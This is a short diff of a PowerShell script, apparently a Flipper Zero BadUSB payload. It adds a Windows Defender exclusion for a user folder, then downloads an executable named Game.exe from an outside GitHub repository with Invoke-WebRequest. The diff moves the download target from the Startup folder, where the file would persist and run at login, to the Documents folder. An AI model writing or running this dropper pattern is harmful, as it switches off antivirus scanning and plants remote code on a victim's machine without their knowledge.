@@ -3,7 +3,7 @@ Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Wind
 
 
 $url = "https://github.com/knoxoxen/flipperstuffs/raw/main/Game.exe"
-$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Game.exe"
+$destination = "$env:USERPROFILE\Documents\Game.exe"
 Invoke-WebRequest -Uri $url -OutFile $destination
 
 
